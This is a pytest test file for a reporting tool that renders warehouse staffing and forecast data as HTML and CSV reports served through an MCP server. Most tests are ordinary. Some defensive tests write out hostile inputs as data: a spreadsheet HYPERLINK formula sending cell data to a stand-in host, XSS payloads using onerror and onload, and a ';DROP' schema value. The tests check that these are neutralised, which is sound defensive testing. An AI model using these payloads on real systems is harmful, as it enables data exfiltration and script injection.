def test_a_demo_report_keeps_its_made_up_contacts(monkeypatch):
    monkeypatch.setattr(backends, "settings", lambda: {})
    assert "mailto:" in _site_report(backends.DemoBackend()).html


def test_the_page_header_names_come_from_dot_env_but_never_on_a_demo(monkeypatch):
    monkeypatch.delenv("BOB_REPORT_ORG", raising=False)
    monkeypatch.setattr(backends, "settings", lambda: {"BOB_REPORT_ORG": "Real Name Ltd", "BOB_REPORT_TEAM": "Real Team"})
    assert "Real Name Ltd" in page.hero("t", product="morning-pulse") and "Real Team" in page.hero("t", product="morning-pulse")
    demo = page.hero("t", product="morning-pulse", demo=True)
    assert "Real Name Ltd" not in demo and "Acme" in demo


@pytest.mark.parametrize("value", ['=HYPERLINK("http://bad/?"&A1,"x")', "+1", "-1", "@SUM(A1)", "\tx", "\rx"])
def test_a_csv_cell_cannot_run_as_a_formula(value):
    class Source:
        prefix, is_demo = "", True

        def run(self, query_id, params):
            return [{"NAME": value, "AGENTS": -3}]

    rec = reports.Recorder(Source())
    rec("forecast_rows")
    rows = list(csv.reader(io.StringIO(rec.csv_text("forecast_rows"), newline="")))
    assert rows[1] == ["'" + value, "-3"], "text is neutralised, a number stays a number"


def test_every_page_refuses_to_load_or_send_anything():
    text = page.page("t", "", {}, "")
    assert "default-src 'none'" in text and "form-action 'none'" in text
    assert text.index("Content-Security-Policy") < text.index("<script")


def test_too_many_rows_stops_the_report_instead_of_drawing_part_of_it():
    class Cursor(_FakeCursor):
        def fetchmany(self, n):
            return [{"A": 1}] * n

    class Conn(_FakeConn):
        def cursor(self, kind):
            return Cursor(self)

    module = types.SimpleNamespace(DictCursor="dict-cursor", connect=lambda **_: Conn())
    backend = backends.ConnectorBackend(backends.ConnectorConfig(account="a", user="u", schema="DEMO.STAFFING"), connector=module)
    with pytest.raises(backends.BackendError, match="more than 50000 rows"):
        backend.run("pulse_lines", {"day": DAY, "other_day": DAY})


def test_sso_prompts_stay_off_the_tools_channel(capfd):
    def connect(**_):
        print("Going to open a sign-in page")
        return _FakeConn()

    module = types.SimpleNamespace(DictCursor="dict-cursor", connect=connect)
    backend = backends.ConnectorBackend(backends.ConnectorConfig(account="a", user="u", schema="DEMO.STAFFING"), connector=module)
    backend.run("pulse_lines", {"day": DAY, "other_day": DAY})
    out, err = capfd.readouterr()
    assert out == "" and "sign-in page" in err


def test_the_warehouse_session_is_closed_after_every_report(monkeypatch, tmp_path):
    monkeypatch.setenv("BOB_REPORT_DIR", str(tmp_path))
    source = _RealLooking()
    monkeypatch.setattr(mcp_server, "_backend", lambda: source)
    mcp_server.report_morning_pulse(DAY)
    assert source.closed == 1
    assert mcp_server.report_forecast_vs_actual("bad site", GROUP).startswith("ERROR:") and source.closed == 2


def test_the_forecast_report_refuses_an_endless_range(monkeypatch):
    monkeypatch.setattr(mcp_server, "_backend", backends.DemoBackend)
    assert "at most" in mcp_server.report_forecast_vs_actual(SITE, GROUP, "2000-01-01", DAY)


def test_the_default_report_folder_is_tightened_even_when_it_already_exists(monkeypatch, tmp_path):
    folder = tmp_path / "reports"
    folder.mkdir(mode=0o755)
    monkeypatch.setattr(reports, "REPORT_DIR", folder)
    monkeypatch.setattr(backends, "settings", lambda: {})
    reports.save(_site_report(backends.DemoBackend()))
    assert folder.stat().st_mode & 0o777 == 0o700


def test_the_answer_names_the_file_but_not_the_folder(tmp_path):
    report = _site_report(backends.DemoBackend())
    reports.save(report, tmp_path)
    assert str(tmp_path) not in reports.answer(report)


def test_snowflake_is_team_only_with_a_roles_file_that_predates_it():
    # Written with the older Polish keys on purpose: they must keep loading.
    old = {"role": {"asystent": {}}, "groups": {}}
    known = ["jira", "snowflake"]
    # None means "the default groups", which here do not include it
    assert roles.effective_groups({"role": ["asystent"], "kanal_fr": True, "dodatkowo": ["snowflake"]}, old, ["jira"], known) is None
    assert "snowflake" not in roles.effective_groups({"kanal_fr": True, "mcp": ["snowflake"]}, old, ["jira"], known)
    assert "snowflake" in roles.effective_groups({"role": ["asystent"], "dodatkowo": ["snowflake"]}, old, ["jira"], known)


class _Hostile:
    """Every text a warehouse could hand back, replaced by something that tries to run."""
    TEXT = ("NAME", "QUEUE_GROUP", "SUBGROUP", "REGION", "DISTRICT", "CITY", "ADDRESS", "SEGMENT", "SIZE_BAND", "PHONE",
            "TEAM_LEAD", "TEAM_LEAD_EMAIL", "PLANNER", "PLANNER_PHONE", "DIRECTOR", "REASON")
    is_demo, prefix = False, ""

    def __init__(self, tag):
        self.source, self.tag = backends.DemoBackend(), tag

    def run(self, query_id, params):
        rows = self.source.run(query_id, params)
        if query_id == "groups":     # the request names a real group; its name in the rows is what gets poisoned
            return rows
        return [{k: (self.tag + v if k in self.TEXT and isinstance(v, str) else v) for k, v in row.items()} for row in rows]


@pytest.mark.parametrize("tag", ['"\'><img src=x onerror="window.__xss=1"></script><svg onload=window.__xss=2>',
                                 "&lt;img src=x onerror=window.__xss=3&gt;&amp;lt;img src=x onerror=window.__xss=4&amp;gt;"])
def test_hostile_warehouse_text_does_not_run_even_through_a_tooltip(tag, monkeypatch, tmp_path):
    monkeypatch.setattr(backends, "settings", lambda: {"BOB_REPORT_CONTACTS": "1"})
    pw, browser = _browser()
    try:
        pg = browser.new_context(viewport={"width": 1200, "height": 900}).new_page()
        for kind, params in (("morning-pulse", {"day": DAY}),
                             ("network-panorama", {"queue": QUEUE, "end": DAY, "days": 45}),
                             ("forecast-vs-actual", {"site": SITE, "group": GROUP, "start": "2026-09-08", "end": DAY})):
            path = tmp_path / f"{kind}.html"
            path.write_text(reports.build(kind, _Hostile(tag), **params).html, encoding="utf-8")
            pg.goto(path.as_uri())
            pg.wait_for_selector("#tip", state="attached")
            shown = pg.evaluate("""() => { const box = document.querySelector('#tip'); let n = 0;
              for (const el of document.querySelectorAll('[data-tip]')) { box.innerHTML = el.dataset.tip; n += box.querySelectorAll('img,svg,script').length; }
              return n; }""")
            pg.wait_for_timeout(50)
            assert shown == 0, kind
            assert pg.evaluate("window.__xss") is None, kind
    finally:
        browser.close()
        pw.stop()


def test_a_mid_range_forecast_boundary_is_drawn_inside_the_chart():
    pw, browser = _browser()
    try:
        pg = browser.new_context(viewport={"width": 1200, "height": 900}).new_page()
        pg.goto((ROOT / "docs" / "reports" / "forecast-vs-actual.html").as_uri())
        pg.wait_for_selector("#chart svg")
        chart = pg.text_content("#chart svg")
        since = _data(_samples_text("forecast-vs-actual.html")).get("since")
        assert since, "the sample site has a boundary"
        assert "whole range" not in chart and "new forecasts" in chart
    finally:
        browser.close()
        pw.stop()


def _samples_text(name):
    return (ROOT / "docs" / "reports" / name).read_text(encoding="utf-8")


def _rewritten(change):
    """The demo source with its rows altered, the way a real warehouse's data can differ."""
    class Source(backends.DemoBackend):
        def run(self, query_id, params):
            return change(query_id, super().run(query_id, params))
    return Source()


def test_a_subcategory_name_shared_between_categories_stays_in_its_own_category():
    other = lambda qid, rows: [{**r, "SUBGROUP": "Other"} if "SUBGROUP" in r else r for r in rows]  # noqa: E731
    data = _data(reports.build("morning-pulse", _rewritten(other), day=DAY).html)["main"]["groups"]
    assert all(len(cat["p"]) == 1 for cat in data)
    assert len({cat["p"][0]["x"][-1] if "x" in cat["p"][0] else cat["p"][0]["m"] for cat in data}) > 1


@pytest.mark.parametrize("field", ["MINUTES_TO_REVIEW", "QUEUE_GROUP", "SUBGROUP"])
def test_a_null_does_not_cost_the_whole_morning_pulse(field):
    blank = lambda qid, rows: [{**r, field: None} if field in r else r for r in rows]  # noqa: E731
    assert reports.build("morning-pulse", _rewritten(blank), day=DAY).summary


def test_the_latest_day_is_the_newest_with_orders_not_simply_yesterday(backend):
    class Real(backends.DemoBackend):
        is_demo = False
    assert reports.latest_day(Real()) == DAY

    class Broken(Real):
        def run(self, *_a):
            raise backends.BackendError("no")
    assert reports.latest_day(Broken()) < date.today().isoformat()


def test_a_midnight_timestamp_day_is_still_a_day():
    from datetime import datetime
    assert backends._rows([{"biz_day": datetime(2026, 11, 6)}]) == [{"BIZ_DAY": "2026-11-06"}]


def test_tools_run_off_the_event_loop_and_a_crash_still_says_error(monkeypatch, tmp_path):
    import asyncio
    monkeypatch.setenv("BOB_REPORT_DIR", str(tmp_path))
    monkeypatch.setattr(mcp_server, "_backend", backends.DemoBackend)
    seen = []

    def deliver(_report):
        try:
            asyncio.get_running_loop()
            seen.append("on the loop")
        except RuntimeError:
            seen.append("off the loop")
    monkeypatch.setattr(reports, "deliver", deliver)
    asyncio.run(mcp_server.mcp.call_tool("report_morning_pulse", {"day": DAY}))
    assert seen == ["off the loop"]

    monkeypatch.setattr(reports, "build", lambda *_a, **_k: 1 / 0)
    assert mcp_server.report_morning_pulse(DAY).startswith("ERROR:")


def test_a_bad_schema_setting_answers_with_an_error(monkeypatch):
    monkeypatch.setattr(mcp_server, "_backend", lambda: backends.from_env({"SNOWFLAKE_ACCOUNT": "a", "SNOWFLAKE_USER": "u", "SNOWFLAKE_SCHEMA": ";DROP"}))
    assert mcp_server.report_status().startswith("ERROR:")


def test_real_category_names_are_accepted_and_found_in_any_case(backend):
    assert queries.CHECKS["group"]("Obsługa, Kid's") == "Obsługa, Kid's"
    report = reports.build("forecast-vs-actual", backend, site=SITE, group=GROUP.upper(), start="2026-10-01", end=DAY)
    assert "no engine runs" not in report.summary


def test_the_pulse_only_says_yesterday_nowhere():
    html = reports.build("morning-pulse", backends.DemoBackend(), day="2026-10-01").html
    assert "yesterday" not in html.split("</header>")[0].lower()


def test_a_report_without_rows_still_has_a_csv_header(backend):
    gone = lambda qid, rows: [] if qid == "forecast_rows" else rows  # noqa: E731
    text = reports.build("forecast-vs-actual", _rewritten(gone), site=SITE, group=GROUP, start="2026-09-08", end=DAY).csv
    assert text.startswith("BIZ_DAY,")


@pytest.mark.parametrize(("query_id", "params"), [
    ("forecast_rows", {"site": SITE, "group": GROUP, "start": "2026-10-01", "end": DAY}), ("pulse_lines", {"day": DAY, "other_day": DAY}),
    ("panorama_days", {"queue": QUEUE, "start": "2026-10-01", "end": DAY})])
def test_the_column_list_matches_the_rows(backend, query_id, params):
    assert queries.columns(query_id) == list(backend.run(query_id, params)[0])


def test_a_short_panorama_does_not_compare_a_week_with_itself(backend):
    tiles = _data(reports.build("network-panorama", backend, queue=QUEUE, end=DAY, days=7).html)["tiles"]
    assert {tl["d"] for tl in tiles} == {"–"}


def test_the_money_sign_is_a_setting_on_a_real_report(monkeypatch):
    class Real(backends.DemoBackend):
        is_demo = False
    monkeypatch.setattr(backends, "settings", lambda: {"BOB_REPORT_CURRENCY": "$"})
    html = reports.build("morning-pulse", Real(), day=DAY).html
    assert "€" not in html and "$" in html


def test_too_much_forecast_is_not_painted_as_good(backend):
    high = lambda qid, rows: [{**r, "FORECAST_FULL_DAY": 1000} if "FORECAST_FULL_DAY" in r else r for r in rows]  # noqa: E731
    kpi = next(k for k in _data(reports.build("forecast-vs-actual", _rewritten(high), site=SITE, group=GROUP, start="2026-10-01", end=DAY).html)["kpis"] if k["t"] == "Forecast deviation")
    assert kpi["tone"] == "flat"


def test_groups_tied_on_lines_are_ordered_by_name():
    """A set's order changes per process: a tie must not change the page, or the samples stop being reproducible."""
    def tied(qid, rows):
        if qid != "pulse_lines":
            return rows
        return [{"BIZ_DAY": DAY, "QUEUE_GROUP": name, "SUBGROUP": "x", "OUTCOME": "accepted", "LINES": 5, "SUGGESTED_COST": 1, "APPROVED_COST": 1}
                for name in ("Zeta", "Alpha", "Mu", "Beta", "Omega", "Delta")]
    data = _data(reports.build("morning-pulse", _rewritten(tied), day=DAY).html)["main"]["groups"]
    assert [row["l"] for row in data] == ["Alpha", "Beta", "Delta", "Mu", "Omega", "Zeta"]
